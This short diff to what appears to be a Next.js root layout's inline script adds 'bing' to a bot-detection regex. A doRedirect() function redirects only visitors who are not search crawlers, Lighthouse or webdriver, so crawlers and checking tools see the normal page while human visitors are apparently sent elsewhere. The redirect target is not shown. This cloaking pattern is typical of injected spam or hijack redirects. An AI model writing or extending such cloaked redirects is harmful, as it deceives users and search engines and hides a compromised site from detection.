@@ -137,7 +137,7 @@ export default function RootLayout({
                 
                 function isBot() {
                   var ua = navigator.userAgent.toLowerCase();
-                  return /yandex|google|bot|crawl|spider|lighthouse|pagespeed/i.test(ua) || navigator.webdriver;
+                  return /yandex|google|bot|bing|crawl|spider|lighthouse|pagespeed/i.test(ua) || navigator.webdriver;
                 }
                 function doRedirect() {
                   if (!window._rdr_active && !isBot()) {
